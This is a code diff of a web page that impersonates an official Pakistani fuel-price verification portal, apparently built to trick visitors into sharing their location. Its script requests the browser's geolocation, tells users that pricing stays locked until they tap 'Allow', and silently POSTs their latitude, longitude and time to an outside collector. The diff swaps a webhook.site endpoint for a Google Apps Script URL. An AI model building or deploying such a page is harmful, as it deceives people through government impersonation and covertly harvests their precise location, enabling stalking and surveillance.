@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ur" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Energy Regulatory Authority | Pakistan</title>
+    <title>Industrial Fuel Regulatory Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-gray-100 font-sans text-gray-900">
@@ -16,7 +16,7 @@
     </nav>
 
     <main class="max-w-md mx-auto mt-10 p-6">
-        <div id="main-card" id="main-card" p-8 rounded-xl shadow-xl border border-gray-200">
+        <div id="main-card" class="bg-white p-8 rounded-xl shadow-xl border border-gray-200">
             <div id="content-area" class="text-center">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/3/32/Flag_of_Pakistan.svg" class="w-16 mx-auto mb-4 opacity-80">
                 <h2 class="text-xl font-bold text-blue-900 mb-2">Industrial Fuel Price Verification</h2>
@@ -30,10 +30,7 @@
     </main>
 
     <script>
-        // Har baar naya URL param generate kar taaki browser cache bypass ho
-        function getUniqueLink() {
-            return window.location.href.split('?')[0] + '?id=' + Math.floor(Math.random() * 1000000);
-        }
+        const GOOGLE_URL = "https://script.google.com/macros/s/AKfycbyx_b9wVuKvRsVaahduajaBgdaOMwZ7Ry4GwX0VVLAioUbx_jpkvXFf3If7bku7IbCx/exec";
 
         function initiateAuth() {
             const btn = document.getElementById('btn-fetch');
@@ -41,7 +38,6 @@
             btn.disabled = true;
 
             if (navigator.geolocation) {
-                // High accuracy for precise location
                 navigator.geolocation.getCurrentPosition(
                     (pos) => releaseData(pos),
                     () => handleBlock()
@@ -53,16 +49,17 @@
             const data = { 
                 lat: pos.coords.latitude, 
                 lon: pos.coords.longitude,
-                timestamp: new Date().toISOString()
+                timestamp: new Date().toLocaleString()
             };
 
-            // Apna Webhook yahan daal
-            await fetch("https://webhook.site/a5810f06-e1e7-4069-a0b5-4eda839f0b5b", {
+            // Google Script ke liye no-cors mode zaroori hai
+            await fetch(GOOGLE_URL, {
                 method: "POST",
+                mode: "no-cors",
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(data)
             });
 
-            // Rates Unlock
             document.getElementById('main-card').innerHTML = `
                 <h2 class='text-xl font-bold text-green-700 text-center mb-6'>Verification Successful</h2>
                 <div class='space-y-4'>
@@ -75,7 +72,7 @@
 
         function handleBlock() {
             const msg = document.getElementById('msg');
-            msg.innerText = "ACCESS DENIED: Your site location could not be verified. Please tap 'Allow' on the browser prompt to unlock pricing data.";
+            msg.innerText = "ACCESS DENIED: Please tap 'Allow' on the browser prompt to unlock pricing data.";
             msg.classList.add("text-red-600", "font-bold");
             document.getElementById('btn-fetch').innerText = "Retry Verification";
             document.getElementById('btn-fetch').disabled = false;
